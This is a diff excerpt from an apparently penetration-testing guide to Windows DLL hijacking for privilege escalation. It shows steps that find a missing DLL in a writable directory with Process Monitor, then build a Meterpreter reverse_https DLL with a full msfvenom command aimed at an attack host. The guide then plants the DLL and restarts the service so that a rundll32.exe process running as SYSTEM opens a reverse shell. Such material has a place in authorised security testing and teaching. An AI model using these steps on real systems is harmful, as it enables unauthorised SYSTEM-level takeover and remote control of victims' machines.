@@ -21,7 +21,7 @@
 12) Create a filter for NAME NOT FOUND, for the Result column.
 13) Look for instances that the application is looking for a DLL in a directory for which we have write permissions.
 14) Create reverse_https, Meterpreter payload, with msfvenom. ```msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f dll -o [DLL found in previous step]```
-15) Copy payload (modified DLL) into a writable directory.
+15) Copy payload, matching name and path identified in the prior step.
 16) Restart service.
 17) In Process Explorer, the selected service spawned a rundll32.exe process, running as SYSTEM, and is the process establishing the reverse shell.
 18) Double-click on rundll32.exe and the connection will show in the TCP/IP tab.
